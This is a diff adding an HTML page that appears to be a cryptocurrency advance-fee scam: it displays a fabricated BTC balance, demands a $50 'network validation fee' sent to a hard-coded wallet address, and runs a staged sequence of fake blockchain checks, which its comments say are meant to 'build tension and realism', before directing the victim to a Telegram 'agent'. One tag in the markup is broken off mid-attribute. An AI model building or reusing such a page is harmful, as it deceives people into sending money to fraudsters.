@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BTC Liquidity Portal | Secure Withdrawal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: white; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .loader { border-top-color: #3b82f6; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .modal-overlay { background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- Main Dashboard -->
+    <div class="w-full max-w-md glass rounded-3xl p-6 shadow-2xl text-center">
+        <div class="flex justify-center mb-4">
+            <div class="bg-blue-500 p-3 rounded-full shadow-lg shadow-blue-500/50">
+                <i class="fas fa-wallet text-2xl text-white"></i>
+            </div>
+        </div>
+        <h1 class="text-xl font-semibold text-slate-300 mb-2">Available Balance</h1>
+        <div class="text-4xl font-bold text-white mb-6 tracking-tight">
+            <span class="text-blue-400">₿</span> 1.42083412
+        </div>
+        
+        <div class="grid grid-cols-2 gap-4 mb-8">
+            <div class="bg-slate-800/50 p-3 rounded-xl border border-slate-700 text-left">
+                <p class="text-xs text-slate-400">USD Value</p>
+                <p class="text-sm font-semibold">$92,410.55</p>
+            </div>
+            <div class="bg-slate-800/50 p-3 rounded-xl border border-slate-700 text-left">
+                <p class="text-xs text-slate-400">Network</p>
+                <p class="text-sm font-semibold text-green-400">Mainnet Active</p>
+            </div>
+        </div>
+
+        <button onclick="openModal()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-4 rounded-2xl transition-all active:scale-95 shadow-lg shadow-blue-600/30">
+            Withdraw Funds
+        </button>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="paymentModal" class="hidden fixed inset-0 modal-overlay flex items-center justify-center p-4 z-50">
+        <div class="w-full max-w-sm glass rounded-3xl p-6 shadow-2xl border border-blue-500/30">
+            <div class="text
+                          <div class="text-center mb-6">
+                <h2 class="text-2xl font-bold text-white mb-2">Network Validation</h2>
+                <p class="text-sm text-slate-400">To prevent unauthorized withdrawals, a one-time network validation fee is required to activate your wallet on the Mainnet.</p>
+            </div>
+
+            <div class="bg-slate-900/50 border border-slate-700 rounded-2xl p-4 mb-6">
+                <div class="flex justify-between mb-2">
+                    <span class="text-xs text-slate-400">Smart Contract Deployment</span>
+                    <span class="text-xs text-white font-semibold">$42.50</span>
+                </div>
+                <div class="flex justify-between mb-2">
+                    <span class="text-xs text-slate-400">Network Validation (Gas)</span>
+                    <span class="text-xs text-white font-semibold">$4.20</span>
+                </div>
+                <div class="flex justify-between mb-2">
+                    <span class="text-xs text-slate-400">Identity Verification Fee</span>
+                    <span class="text-xs text-white font-semibold">$3.30</span>
+                </div>
+                <div class="border-t border-slate-700 my-2 pt-2 flex justify-between">
+                    <span class="text-sm font-bold text-blue-400">Total Required</span>
+                    <span class="text-sm font-bold text-white">$50.00</span>
+                </div>
+            </div>
+
+            <div class="mb-6">
+                <p class="text-center text-xs text-slate-500 mb-2">Send BNB or USDT (BEP20) to the address below:</p>
+                <div class="flex items-center bg-slate-800 border border-slate-600 rounded-xl p-3 gap-2">
+                    <span class="text-xs font-mono text-blue-300 truncate flex-1">0x44C1185622e376E930b5A10a81e2e76B3dD09203</span>
+                    <button onclick="copyAddress()" class="bg-blue-600 hover:bg-blue-500 text-white text-xs px-3 py-1 rounded-lg transition-colors">
+                        Copy
+                    </button>
+                </div>
+                <div id="copyToast" class="text-center text-xs text-green-400 mt-2 opacity-0 transition-opacity">Address Copied!</div>
+            </div>
+
+            <button onclick="verifyPayment()" class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-4 rounded-2xl transition-all active:scale-95 shadow-lg shadow-green-600/30">
+                Verify Payment
+            </button>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="hidden fixed inset-0 modal-overlay flex flex-col items-center justify-center p-4 z-[60]">
+        <div class="loader w-16 h-16 border-4 border-slate-700 rounded-full mb-4"></div>
+        <p id="loadingText" class="text-lg font-medium text-white animate-pulse">Querying Mainnet...</p>
+    </div>
+        <script>
+        const paymentModal = document.getElementById('paymentModal');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const copyToast = document.getElementById('copyToast');
+
+        function openModal() {
+            paymentModal.classList.remove('hidden');
+        }
+
+        function copyAddress() {
+            const address = "0x44C1185622e376E930b5A10a81e2e76B3dD09203";
+            navigator.clipboard.writeText(address).then(() => {
+                copyToast.classList.remove('opacity-0');
+                setTimeout(() => {
+                    copyToast.classList.add('opacity-0');
+                }, 2000);
+            });
+        }
+
+        async function verifyPayment() {
+            // Close payment modal and show loading overlay
+            paymentModal.classList.add('hidden');
+            loadingOverlay.classList.remove('hidden');
+
+            // Sequence of "Blockchain" checks to build tension and realism
+            const steps = [
+                "Querying Mainnet...",
+                "Validating Transaction Hash...",
+                "Checking Gas Fee Allocation...",
+                "Syncing with Network Nodes...",
+                "Finalizing Verification..."
+            ];
+
+            for (let i = 0; i < steps.length; i++) {
+                loadingText.innerText = steps[i];
+                await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 1000));
+            }
+
+            // The Final "Bottleneck" - redirecting to an agent or error
+            alert("Verification Pending: Due to high network congestion, your transaction is being manually reviewed. Please contact your providing agent on Telegram to finalize the withdrawal.");
+            
+            loadingOverlay.classList.add('hidden');
+            paymentModal.classList.remove('hidden'); 
+        }
+    </script>
+</body>
+</html>
